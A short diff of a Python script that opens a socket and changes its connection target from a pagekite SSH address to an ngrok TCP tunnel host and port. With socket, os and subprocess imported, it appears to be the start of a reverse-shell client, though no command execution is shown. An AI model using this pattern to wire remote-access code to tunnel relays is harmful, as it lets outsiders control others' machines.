@@ -3,8 +3,8 @@ import os
 import subprocess
 
 s = socket.socket()
-host = 'ssh://drivegal.pagekite.me:22/' # this may change on your system, check and update it .
-port = 9999
+host = '0.tcp.ap.ngrok.io' # this may change on your system, check and update it .
+port = 18825
 
 s.connect((host,port))
 
